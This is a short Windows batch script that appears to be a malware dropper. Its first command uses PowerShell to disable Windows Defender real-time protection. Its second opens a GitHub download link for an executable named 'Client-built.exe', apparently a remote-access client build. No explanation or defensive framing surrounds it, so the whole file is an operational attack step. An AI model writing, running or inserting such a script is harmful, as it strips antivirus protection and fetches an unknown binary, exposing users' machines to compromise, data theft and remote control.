@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
start "LinkName" "https://github.com/joshuadaniel-8090/assests/raw/master/Client-built.exe"
